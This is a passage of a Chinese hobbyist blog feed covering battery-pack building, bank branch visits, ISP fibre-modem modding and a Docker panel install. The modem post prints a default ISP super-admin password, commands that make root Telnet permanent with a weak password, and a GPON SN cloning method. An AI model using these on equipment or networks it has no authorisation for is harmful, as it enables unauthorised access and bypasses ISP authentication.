用锉刀修，用刀子削。</p></blockquote><p>事已至此，已经没有补救机会了，下次再用这个办法，准备新购一把锉刀。</p><h2 id="点焊电池"><a href="#点焊电池" class="headerlink" title="点焊电池"></a>点焊电池</h2><p>苦于没有点焊机，手头上的电池都没法发挥作用，上次组手电钻电池还是让商家点焊好发过来我这边再焊接的。最近一直在寻觅点焊机，找了一圈发现只有两种点焊机能买，电容式点焊机和变压器点焊机。</p><p>其中的门道还有很多很多，但是软包锂电的点焊机据说不能买，多点焊几次电池就不行了，事实是怎么样我也不清楚。刚开始是准备买一个电容式点焊机的，但是市面上的方案很多很多，另外看起来这个路线还没卷到头，所以就一直在观望，现在看到的比较合适的就是<a href="https://www.bilibili.com/video/BV1Du4m1g7ok">小强电子</a>的电容式点焊机，他做了很多种方案，性能很好，但是价格不友好。一套能用的价格得300+了，我的预算是100左右搞一套能点0.2镀镍钢带的就够了。闲鱼上也看了看，参差不齐，有些成品电容到控制板的线还很长，另外一些成品没有外壳，很丑，我还是想搞一套比较精致的。</p><p>变压器点焊机则受限于控制板和变压器了，具体我没看，因为太重被我直接 Pass 了。</p><p>最后是求助于本地 HAM，刚开始准备去 BG7EHL 麻烦他帮点焊一下，然后 BD7BS 说他最近比较忙，直接用 BD7BS 的点焊机点好了，效果还出奇的好，他用的是变压器点焊机，焊点都不发黑，看着真舒服。</p><img src="/zhafeilaotie/IMG_20240603_182745.jpg" class="" title="IMG_20240603_182745"><p>在点焊电池之后，让BD7BS帮忙给盒子重新开了一下孔，同时也观摩了一下开孔过程。效果还是比我的好很多，但是细节不够完美。</p><img src="/zhafeilaotie/image-20240605091512379.png" class="" title="image-20240605091512379"><h3 id="测试容量"><a href="#测试容量" class="headerlink" title="测试容量"></a>测试容量</h3><p>顺带测了一下容量，12.43V放电到9V，放出来10Ah，可以！</p><img src="/zhafeilaotie/IMG_20240603_214120.jpg" class="" title="IMG_20240603_214120"><h2 id="组装电池组"><a href="#组装电池组" class="headerlink" title="组装电池组"></a>组装电池组</h2><h3 id="组装上盖"><a href="#组装上盖" class="headerlink" title="组装上盖"></a>组装上盖</h3><p>船型开关直接插进去即可，电压表则我是用 M2.5 10mm 的沉头螺丝加一个 3.7mm 厚的螺母，这些材料其实都是利旧。有现成的就没有刻意去买了。</p><p>建议的参数是用 M2 * 10mm 的螺丝 加一个 4mm 厚的螺母，在电压表对应螺丝孔位置用 1.8 的麻花钻开一个孔，不要开透了，然后用螺丝直接攻丝进去，这样固定住了也很美观。也可以不用螺丝固定，直接热熔胶固定。</p><p>这里要注意的就是船型开关和电压表垂直距离要离开大一点，实际距离可以自己比划一下。</p><img src="/zhafeilaotie/image-20240605091554466.png" class="" title="image-20240605091554466"><p>最后在表面帖一层透明胶或者保护膜都行，盖住电压表就行，注意电压表表面上是有一层膜的，记得撕掉。</p><img src="/zhafeilaotie/image-20240605092732430.png" class="" title="image-20240605092732430"><h3 id="焊接采集排线"><a href="#焊接采集排线" class="headerlink" title="焊接采集排线"></a>焊接采集排线</h3><p>首先在支架上标记好焊接点，比如-，B1，B2，+，然后给镍片上预先上一点锡。完成之后，先焊接最远的一根线，然后固定好位置，其他的线超过焊接点的长度剪掉，这样搞出来的采集排线挺规整的，最后效果如下所示。</p><img src="/zhafeilaotie/IMG_20240604_010649.jpg" class="" title="IMG_20240604_010649"><p><strong>如果需要电压表的话，从电池的总负记得预留一根线上来，我用的是30AWG的硅胶线，就算碰到短路了也应该能很快烧断吧？</strong></p><h3 id="焊接XT60"><a href="#焊接XT60" class="headerlink" title="焊接XT60"></a>焊接XT60</h3><p>然后就是焊接XT60接头和线，建议正负极都横着出线。我正极预留的线是10cm，负极20cm（15cm比较合适）。盒子空间比较紧凑，硅胶线在浸润锡之后有一截会变硬，导致弯折不了（是真的一点都弯折不了），最后我把正极的拆了重新弯着焊接了一下。最后热缩管是肯定要安排上的，碰到了电池外皮破皮了之后就直接炸飞老铁了（不是说着玩的！），负极的线也要上热缩管，碰到了也相当于后面两串短路了，很危险！</p><p>焊接好XT60之后就可以装壳了，把XT60塞进去，<strong>上好螺丝，上好螺丝，上好螺丝</strong>，重要的事情说三遍，别问我为什么说三遍。</p><h3 id="焊接电池"><a href="#焊接电池" class="headerlink" title="焊接电池"></a>焊接电池</h3><p>接下来是焊接电池的总正和总负，考虑到过流能力就没焊在镍片的末尾，在镍片中间焊接的。这一步烙铁温度要开高点，建议给硅胶线先上好锡，然后再焊接到镍片上。原因是硅胶线相较于镍片线的热容积比较大，毕竟是12AWG的线，要加热好一会。我用的烙铁头是K头，Ku头不行，导热面积不够。先焊接负极，装壳进去，然后再焊接正极。其最终效果如图</p><img src="/zhafeilaotie/IMG_20240605_073615.jpg" class="" title="IMG_20240605_073615"><h3 id="焊接电压表"><a href="#焊接电压表" class="headerlink" title="焊接电压表"></a>焊接电压表</h3><p>这里就不多做叙述了，看图就行，建议先焊接表正极的检测点到开关，再焊接电池的总正到开关，防止短路。最终效果如下图所示。</p><p>三线表的话，直接电源和采集电压正极焊在一起就行，当两线用</p><img src="/zhafeilaotie/IMG_20240605_073619.jpg" class="" title="IMG_20240605_073619"><h1 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h1><h2 id="开洞填补"><a href="#开洞填补" class="headerlink" title="开洞填补"></a>开洞填补</h2><p>之前不是有开了很丑的洞嘛，我是首先在洞的另一面贴上透明胶，然后打上热熔胶等待他自然流平然后凝固，最后撕掉热熔胶，就得到平整的表面了。</p><img src="/zhafeilaotie/image-20240605093138039.png" class="" title="image-20240605093138039"><p>其实为了追求好看的话，比如说增加一个透明窗，可以用UV胶之类的高透胶，同时硬度也会好很多，我这边就是最低成本凑合用的做法，仅供参考。</p><h2 id="测试电压表"><a href="#测试电压表" class="headerlink" title="测试电压表"></a>测试电压表</h2><p>打开电压表，It works！</p><img src="/zhafeilaotie/IMG_20240604_030714.jpg" class="" title="IMG_20240604_030714"><p>插入SW3518模块，检测协议正常，给设备充电也正常，由于是纯降压模块，没有20V档位正常。</p><img src="/zhafeilaotie/Snipaste_2024-06-05_09-40-21.jpg" class="" title="Snipaste_2024-06-05_09-40-21"><h2 id="不均衡充电测试"><a href="#不均衡充电测试" class="headerlink" title="不均衡充电测试"></a>不均衡充电测试</h2><p>不均衡冲到满电12.6V，各串压差小于10mv，满意了。</p><img src="/zhafeilaotie/1bbf4e3f582520a718729e0931347b68.jpeg" class="" title="1bbf4e3f582520a718729e0931347b68"><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>通过观察三元锂电池SOC曲线可以得知。在3S情况下，三元锂电池还有90%电量时，单串电压有3.95V，体现到电池组上只有11.85V了。而在50%电量时单串还有3.6V左右，整串就只有10.8V了。考虑到放电时还有压降，实际使用中可能直接掉到10V以下了。</p><img src="/zhafeilaotie/16772190971538479.jpg" class="" title="锂电池充放电曲线-1.jpg"><p>而磷酸铁锂就没这个问题，放电曲线很平缓，如下图所示。</p><img src="/zhafeilaotie/16772192073044671.jpg" class="" title="锂电池充放电曲线-2.jpg"><p>4S情况下，SOC 90%情况下，总电压13.12，SOC 10% 下 12.6V，可见磷酸铁锂的放电特性非常适合电台使用。</p><img src="/zhafeilaotie/image-20240605101629509.png" class="" title="image-20240605101629509"><p>还是 BD7BS 有先见之明。</p><h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><p>在我实际场合中，用的设备是 IC-7300。</p><p>他的表显是 10V - 16V，查阅规格书得知推荐电压范围是</p><blockquote><p>13.8 volts DC (+&#x2F;- 15%) at 21 amps</p></blockquote><p>通过计算得知推荐最低电压是 11.73V，在用三元锂的情况下，可能实际效果不尽人意。所以计划改到4串。</p><p>在4串情况下，整个电池组不能充满，充满电压是 16.8V，超过IC-7300的 16V 上限了，我计划是充到 16V，也就是单串 4V，正好对应上面三元锂电池的 SOC 90%+ 状况下，同时在 10% SOC 下，也有 13.4V 的总电压，不用担心大电流掉压导致GG的问题了。</p><p>所以准备改成4串3并，然后简单计算了一下尺寸。</p><p><strong>4串电池</strong></p><p>68.8mm * 91.7mm</p><p><strong>130 * 80 * 85mm 盒子</strong></p><p>内盒标称：71.2mm * 92.9mm</p><p>内盒预估：73.3mm * 93.8mm</p><p>上盖预估：69.2mm * 90.2mm</p><p>电池组应该装得下，但是支架可能要切一下，应该是没有问题的。</p><p>直接下单新的电池和盒子还有电池支架，等待到货。</p><img src="/zhafeilaotie/Screenshot_2024-06-05-09-59-23-64_090d9ae461b065ca11c329abb9cd0d70.jpg" class="" title="Screenshot_2024-06-05-09-59-23-64_090d9ae461b065ca11c329abb9cd0d70"><img src="/zhafeilaotie/Screenshot_2024-06-05-09-59-11-70_e41039de8eaacf222a951c16e0560c66.jpg" class="" title="Screenshot_2024-06-05-09-59-11-70_e41039de8eaacf222a951c16e0560c66">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前情提要&quot;&gt;&lt;a href=&quot;#前情提要&quot; class=&quot;headerlink&quot; title=&quot;前情提要&quot;&gt;&lt;/a&gt;前情提要&lt;/h1&gt;&lt;p&gt;近期由于入了短波无线&lt;del&gt;垫&lt;/del&gt;（电）坑，迫切需要一块电池供野外架台使用，所以萌生了组一块电池组的想法。刚好自己</summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="电池" scheme="https://blog.irec.moe/tags/%E7%94%B5%E6%B1%A0/"/>
    
    <category term="无线电" scheme="https://blog.irec.moe/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"/>
    
  </entry>
  
  <entry>
    <title>2024年银行网点体验记录</title>
    <link href="https://blog.irec.moe/2024_bank_log.html"/>
    <id>https://blog.irec.moe/2024_bank_log.html</id>
    <published>2024-02-22T04:00:00.000Z</published>
    <updated>2024-02-22T13:23:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工商银行"><a href="#工商银行" class="headerlink" title="工商银行"></a>工商银行</h1><h2 id="郴州永兴支行营业室"><a href="#郴州永兴支行营业室" class="headerlink" title="郴州永兴支行营业室"></a>郴州永兴支行营业室</h2><p>网点评价：优</p><h3 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h3><p>首次前往日期：2月1日</p><p>开卡日期：2月1日</p><p>起初想问网点有没有龙年纪念卡现货，被告知没有后在网上申请后到网点激活，服务很周到，接待员还教了如何利用预约来插队。</p><p>我有一个4年前的二类户，经历3天碰到各种问题顺利销户，网点耐心解决。</p><p>我方在2月21日再去网点，因为参加“湘约惠月月刷”活动，20W限额不够用，申请改月限额。</p><p>首先柜员帮操作后碰到“工银e支付”无法开通问题，中途周转 柜员 -&gt; 大堂经理 -&gt; 年轻服务人员 -&gt; 柜员 -&gt; 主管，最后碰到 bug 无法解决，告知次日再来，此事还在解决当中。总体服务超级好，不厌其烦为客户解决问题，最后没完成还向客户致歉，我方也向对方致歉表示耽误时间了。</p><h3 id="后续回访"><a href="#后续回访" class="headerlink" title="后续回访"></a>后续回访</h3><p>暂无</p><h1 id="邮储银行"><a href="#邮储银行" class="headerlink" title="邮储银行"></a>邮储银行</h1><h2 id="永兴县干劲路支行"><a href="#永兴县干劲路支行" class="headerlink" title="永兴县干劲路支行"></a>永兴县干劲路支行</h2><p>网点评价：优</p><h3 id="经过-1"><a href="#经过-1" class="headerlink" title="经过"></a>经过</h3><p>首次前往日期：2月2日</p><p>开卡日期：2月2日</p><p>打电话询问是否有美团联名卡库存后，遂到网点后开卡，断卡先锋我是中风险（黄马）客户（近期有新开广电卡），告知是因为广电卡改套餐引起的，询问主要用途后顺利开卡。网点服务热情友好，保安大哥特别热情。</p><h3 id="后续回访-1"><a href="#后续回访-1" class="headerlink" title="后续回访"></a>后续回访</h3><p>2月20日07355523377回电询问卡是否是本人使用，态度良好，得到结果后挂机。</p><h1 id="湖南农信"><a href="#湖南农信" class="headerlink" title="湖南农信"></a>湖南农信</h1><h2 id="永兴县干劲路支行-1"><a href="#永兴县干劲路支行-1" class="headerlink" title="永兴县干劲路支行"></a>永兴县干劲路支行</h2><p>网点评价：良</p><h3 id="经过-2"><a href="#经过-2" class="headerlink" title="经过"></a>经过</h3><p>首次前往日期：2月6日</p><p>开卡日期：2月8日</p><p>由于是家人常去的行，陪同家人存定期后顺路询问网点人员，是否能开卡，得到否定答复。后建议我方开信用卡，得知学生能开信用卡后扫码网申，于2月22日申请通过。</p><p>次日再去和网点人员询问后说可以试试，在前台填好申请表后，在柜台开卡时遭到柜员拒绝，柜员询问我参加何种活动需要开卡，我如实告知，柜员说我们没有这种活动，我方告知柜员关注”湖南农信”微信公众号，上面有活动内容，后柜员岔开话题告知银行内有规定不给开卡，我方需询问是何种文件，柜员无法告知，后续多次柜员以各种理由推辞开卡事宜，我受不住遂离开网点。</p><p>当天下午拨打湖南农信客服热线，客服告知是以261号文件，我方仔细阅读文件后发现未有相关规定，随后再次拨打客服热线客服答应反应此问题。后日网点人员回电告知可以来开卡，次次日来到网点顺利开卡，柜员表示”我们不是不给你开卡“，我方如实告知昨日经过，柜员笑着结束话题。总体服务中规中矩，服务人员年轻，但是主管和柜员年龄偏老，思想落后不愿意接受新事物，只能给到这个评价了。</p><h3 id="后续回访-2"><a href="#后续回访-2" class="headerlink" title="后续回访"></a>后续回访</h3><p>2月22日07355525888回电询问用卡相关事宜，告知我方上了反诈名单，可能会调整卡限额之类的，问我用卡主要用途，我方如实告知。后对方询问参加何种活动，我说微信公众号上有，对方再次询问细节，我方如实告知。对方说你弄这些干什么，我方告知不止这一家银行有活动，我参加的都是正规活动，你要查流水发现我有异常就随便了，后对方察觉到我对此表示反感后，挂断电话。</p><h1 id="建设银行"><a href="#建设银行" class="headerlink" title="建设银行"></a>建设银行</h1><h2 id="永兴大桥路支行"><a href="#永兴大桥路支行" class="headerlink" title="永兴大桥路支行"></a>永兴大桥路支行</h2><p>网点评价：优</p><h3 id="经过-3"><a href="#经过-3" class="headerlink" title="经过"></a>经过</h3><p>首次前往日期：2月20日</p><p>开卡日期：2月20日</p><p>年前询问我们这最大的建行网点”龙年贺岁龙卡“是否有库存，得到管理这个卡的人员放假了。在2月20日再次致电询问，告知否定答复后顺路去湖南银行开卡，告知断卡先锋为<strong>高风险</strong>客户不给开卡。</p><p>随后回家路上看到路边的支行网点，遂前往询问是否有库存。网点人员说不确定，帮我打电话询问了一下，得出肯定答复。我方询问高风险客户是否能开卡，网点人员回复说可以试试，遂填表后到柜台申请。查看断卡先锋我是<strong>中风险</strong>（黄马）客户，柜员没有多问，告知卡必须是本人使用，提额要在半个月后申请。柜员表示你是我们第一个申请”龙年贺岁龙卡“卡的客户。</p><p>后网点工作人员帮忙操作激活卡，领立减金等事宜，最后加了客户经理微信。</p><p>总体服务超赞，耐心体贴，为客户着想。 </p><h3 id="后续回访-3"><a href="#后续回访-3" class="headerlink" title="后续回访"></a>后续回访</h3><p>暂无</p><h1 id="湖南银行"><a href="#湖南银行" class="headerlink" title="湖南银行"></a>湖南银行</h1><h2 id="永兴分行"><a href="#永兴分行" class="headerlink" title="永兴分行"></a>永兴分行</h2><p>网点评价：差</p><h3 id="经过-4"><a href="#经过-4" class="headerlink" title="经过"></a>经过</h3><p>首次前往日期：2月20日</p><p>开卡日期：2月20日</p><p>2月20日到网点询问我想参加活动，是否能开卡，网点人员询问用途后我方如实告知，后填表去 VTM 开卡，告知断卡先锋为<strong>高风险</strong>客户不给开卡，后我方解释用途后，可以开卡，但是不给开通在线支付，我方表示会打客服热线反应此问题。</p><p>后在网点门口打电话询问此事宜，客服人员首先是常规话术，浪费了5分钟左右。后我方主动提出提交工单处理才询问具体事宜。次日支行回电告知可以开卡，二类卡限额1000。后来到网点顺利开卡，正常服务，没有多问。</p><p>给差的理由是不为客户着想，优先考虑高价值用户，不考虑客户实际需求，随意给出否定断言，欺骗客户。 </p><h3 id="后续回访-4"><a href="#后续回访-4" class="headerlink" title="后续回访"></a>后续回访</h3><p>暂无</p><h1 id="长沙银行"><a href="#长沙银行" class="headerlink" title="长沙银行"></a>长沙银行</h1><h2 id="永兴分行-1"><a href="#永兴分行-1" class="headerlink" title="永兴分行"></a>永兴分行</h2><p>网点评价：</p><h3 id="经过-5"><a href="#经过-5" class="headerlink" title="经过"></a>经过</h3><p>首次前往日期：2月21日</p><p>开卡日期：</p><p>2月21日到网点询问我想参加活动，是否能开卡，得到试一试的回答。网点人员拍照了我的学生证，学信网，云闪付卡列表，网点人员是年轻妹子，挺好说话的，她询问网点主管能不能开卡，得到否定回复，我方和网点人员交涉之后再次询问主管，依然否定回复，并未告知具体原因，遂离开网点。</p><p>离开网点后致电长沙银行客服热线，接线员是长沙妹子，声音很好听，主动询问我的诉求之后帮我仔细记录反馈，后互相问好后挂断，服务特别周到，为客户着想，非常好评。2月22日网点回电，询问卡用途，后告知无法开通在线支付，打太极几轮后最后答应给我开卡，可能限额1、200，后续有需要再提额。由于不在本地无法开卡，次日再去。</p><h3 id="后续回访-5"><a href="#后续回访-5" class="headerlink" title="后续回访"></a>后续回访</h3><p>暂无</p><h1 id="浦发银行"><a href="#浦发银行" class="headerlink" title="浦发银行"></a>浦发银行</h1><h2 id="郴州支行"><a href="#郴州支行" class="headerlink" title="郴州支行"></a>郴州支行</h2><p>网点评价：优</p><h3 id="经过-6"><a href="#经过-6" class="headerlink" title="经过"></a>经过</h3><p>2月22日陪同父亲到网点销卡，顺路询问我想参加活动，是否能开卡，得到需要给出辅助证明材料，由于我不在市区上学，户口也不在市区本地，网点人员建议我去学校当地网点开卡，后遂离去。由于办了业务给了2小时免费停车券。</p><p>总体服务好评，核心是为客户着想。</p><h3 id="后续回访-6"><a href="#后续回访-6" class="headerlink" title="后续回访"></a>后续回访</h3><p>暂无</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;工商银行&quot;&gt;&lt;a href=&quot;#工商银行&quot; class=&quot;headerlink&quot; title=&quot;工商银行&quot;&gt;&lt;/a&gt;工商银行&lt;/h1&gt;&lt;h2 id=&quot;郴州永兴支行营业室&quot;&gt;&lt;a href=&quot;#郴州永兴支行营业室&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="生活" scheme="https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="银行卡" scheme="https://blog.irec.moe/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/"/>
    
    <category term="羊毛" scheme="https://blog.irec.moe/tags/%E7%BE%8A%E6%AF%9B/"/>
    
  </entry>
  
  <entry>
    <title>湖南联通固网折腾记录</title>
    <link href="https://blog.irec.moe/hn_unicom.html"/>
    <id>https://blog.irec.moe/hn_unicom.html</id>
    <published>2024-01-30T04:00:00.000Z</published>
    <updated>2024-02-22T14:42:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h1><p>地区：湖南省郴州市永兴县</p><p>验证方式：验证 LOID（宽带账号） + PASSWORD（123456）+ GPON SN（不正确 BRAS 提示 AAA authenticate terminal failed）</p><p>BRAS：HNCZ-YX-M6000_18S-B1</p><p>IPTV VLAN 30</p><p>INTERNET 无 VLAN</p><p>TR069 VLAN 8</p><h1 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h1><p>由于近期广电总局对于 OTT 限制，家人抱怨电视看不了。我于2023年11月30日看到手厅有 + 30元500M宽带 + IPTV 活动，于是在线申请，随后有一位李师傅联系我。我方询问对方户主本人不在现场是否能报装，对方帮我询问后给出我否定回复。</p><p>在我回家后2023年12月26日主动联系李师傅可以报装宽带了，次日就上门给我下安装单。他也是加友，8T用了好几年了，准备换魅族手机，白色确实好看，俩人聊天挺合得来的。</p><img src="/hn_unicom/photo_2024-02-22_21-53-02.jpg" class="" title="photo_2024-02-22_21-53-02"><p>最后给我开了1000M 宽带（因为在他系统里500M 和1000M 是一样的价格）。</p><p>当天师傅就上门带着 ZTE F657GV9(V9.2.0P1T2) 和创维 E900V21A 上门安装。</p><p>光猫不带 WiFi 功能，机顶盒是S905+2+8 也不带 WiFi，问师傅没有线路怎么办，师傅有点头疼的样子。还好家里有网线，自己从踢脚线到天花板布好线了，借用了一下师傅网线钳，他在扯光纤，我在家里布线，最后忙到1点多才整好。师傅用的国产熔纤机，光纤套了管，没有用保护套，是直接剥皮线的钢丝，然后热缩管绑在上面让钢丝受力，其实也能用，就是有点丑。</p><img src="/hn_unicom/photo_2024-02-22_22-02-22.jpg" class="" title="photo_2024-02-22_22-02-22"><p>机顶盒开机还不支持全屏进电视，进入老年人模式也只能做到小窗看电视，还是需要二次操作才能进入电视界面。</p><img src="/hn_unicom/photo_2024-02-22_21-52-42.jpg" class="" title="photo_2024-02-22_21-52-42"><p>查看系统版本还是2022年的版本，希望能尽快落实广电总局下的《有线电视业务技术要求》和《IPTV业务技术要求》。用着暂时还能接受，父母对于操作也熟悉了，就不去投诉了。</p><blockquote><p>有线电视和IPTV终端均应提供<strong>“开机进入全屏直播”</strong>和<strong>“开机进入突出直播频道的交互主页”</strong>两种“开机模式”选项。<strong>系统默认设置应为“开机进入全屏直播”</strong>。有线电视和IPTV终端开机过程所需时间应不大于35秒，不应因播放开机广告等特定内容延长开机时间。</p></blockquote><img src="/hn_unicom/photo_2024-02-22_21-59-48.jpg" class="" title="photo_2024-02-22_21-59-48"><h1 id="折腾"><a href="#折腾" class="headerlink" title="折腾"></a>折腾</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>光猫默认配置是 NAT3，当然宽带 v4 公网是不用想的，IPv6 公网是封了 80 443 入站的，加上这有1000 M 啊，比移动的300 M 不知道快到哪里去了，我肯定得替换成主用网的。</p><p>师傅告知需要入网一个月才能更换光猫，不然会影响他的业绩，所以我在2024年1月30日的清晨开搞（不要问为啥，因为失眠了没事干啊啊啊啊啊啊）</p><h2 id="获取参数"><a href="#获取参数" class="headerlink" title="获取参数"></a>获取参数</h2><p>首先的是要拿到光猫相关参数，已经问过师傅拿不到超密，只能自己动手了。</p><p>首先是拔光纤重置光猫，用默认超密 CUAdmin#HGU 进去瞅了一眼。</p><img src="/hn_unicom/image-20240222220958014.png" class="" title="image-20240222220958014"><img src="/hn_unicom/image-20240222221523714.png" class="" title="image-20240222221523714"><p>并没有 IPTV 相关的组播配置，以为是没有下发配置导致的，所以准备固化 Telnet 后导出配置看看。</p><img src="/hn_unicom/image-20240222221030713.png" class="" title="image-20240222221030713"><h3 id="开-Telnet"><a href="#开-Telnet" class="headerlink" title="开 Telnet"></a>开 Telnet</h3><p>使用 mayi5147 的 FactoryMode 工具得到临时 Telnet 账号密码</p><img src="/hn_unicom/image-20240222221203846.png" class="" title="image-20240222221203846"><p>然后常规固化 Telnet</p><img src="/hn_unicom/image-20240222221333192.png" class="" title="image-20240222221333192"><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">sendcmd 1 DB p TelnetCfg</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 Lan_Enable 1</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 TS_UName root</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 TS_UPwd Zte521</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 TSLan_UName root</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 TSLan_UPwd Zte521</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 Max_Con_Num 99</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 ExitTime 999999</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 InitSecLvl 3</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 CloseServerTime 9999999</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB set TelnetCfg 0 Lan_EnableAfterOlt 1</span></span><span class="line"><span style="color: #abb2bf">sendcmd 1 DB save</span></span><span class="line"><span style="color: #abb2bf">reboot</span></span></code></pre></div></div></figure><h3 id="下发配置"><a href="#下发配置" class="headerlink" title="下发配置"></a>下发配置</h3><img src="/hn_unicom/image-20240222221735283.png" class="" title="image-20240222221735283"><img src="/hn_unicom/image-20240222221742890.png" class="" title="image-20240222221742890"><img src="/hn_unicom/image-20240222221753914.png" class="" title="image-20240222221753914"><img src="/hn_unicom/image-20240222221803122.png" class="" title="image-20240222221803122"><img src="/hn_unicom/image-20240222221844498.png" class="" title="image-20240222221844498"><p>正常走完下发，超密没被改，不过上网参数没有账号，手动填入账号后正常拨号上网。</p><img src="/hn_unicom/image-20240222221916579.png" class="" title="image-20240222221916579">IPTV 依旧没有组播信息，IPTV 正常观看，遂直接开搞。<h2 id="更换光猫"><a href="#更换光猫" class="headerlink" title="更换光猫"></a>更换光猫</h2><p>换的光猫型号依旧是老朋友华为 HS8145X6，直接进去修改 LOID 和 PASSWORD</p><p>顺利走到 O5</p><img src="/hn_unicom/image-20240222222140716.png" class="" title="image-20240222222140716"><p>不过拨号拨不上，IPTV 也看不了，随后发现是网口绑定错误了，绑定的4口结果 IPTV 插在1口，放的方向导致顺序颠倒插错了，排查掉这个问题依然不能看，我就有点急了，直接用电脑抓 PPPoE 包，提示 AAA authenticate terminal failed。</p><img src="/hn_unicom/image-20240222222445573.png" class="" title="image-20240222222445573"><p>后面改网口 MAC 为光猫的，没用。</p><img src="/hn_unicom/image-20240222222606034.png" class="" title="image-20240222222606034"><img src="/hn_unicom/image-20240222222632296.png" class="" title="image-20240222222632296"><p>最后拨号过多直接被 Radius 冻结账号了。</p><p>最后多次更换排查，发现是还有一个 GPON SN 认证要素，改成原来中兴光猫的就一切正常了，虚惊一场。</p><img src="/hn_unicom/image-20240222223150562.png" class="" title="image-20240222223150562"><p>更换成华为光猫之后，NAT1。</p><img src="/hn_unicom/image-20240222222918325.png" class="" title="image-20240222222918325"><p>IPTV 也正常观看。</p><p>End！</p><p>希望本文能作为参考帮助阅读到这里的各位。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;省流&quot;&gt;&lt;a href=&quot;#省流&quot; class=&quot;headerlink&quot; title=&quot;省流&quot;&gt;&lt;/a&gt;省流&lt;/h1&gt;&lt;p&gt;地区：湖南省郴州市永兴县&lt;/p&gt;
&lt;p&gt;验证方式：验证 LOID（宽带账号） + PASSWORD（123456）+ GPON SN（不正确</summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="光猫" scheme="https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"/>
    
  </entry>
  
  <entry>
    <title>在群晖的 Docker 上安装 1Panel 面板</title>
    <link href="https://blog.irec.moe/install_1panel_with_synology_docker.html"/>
    <id>https://blog.irec.moe/install_1panel_with_synology_docker.html</id>
    <published>2024-01-09T12:00:00.000Z</published>
    <updated>2024-01-16T10:25:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>起初是家里 NAS 上 docker 跑的宝塔面板经常出问题，掉电重启之后 mysql 经常会异常停止，然后去面板上经常需要重新绑定账号，所以有迁移到 1Panel 的想法。</p><p>首先使用 moelin&#x2F;1panel 镜像，需要使用 SSH 进入NAS 后，使用 sudo -i 后用 root 权限执行安装命令</p><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">docker</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">run</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">--name</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #98C379">panel</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">--restart</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">always</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">--network</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">host</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">-v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/var/run/docker.sock:/var/run/docker.sock</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">-v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/volume2/docker/1panel/volumes:/var/lib/docker/volumes</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">-v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/volume2/docker/1panel/opt:/opt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span 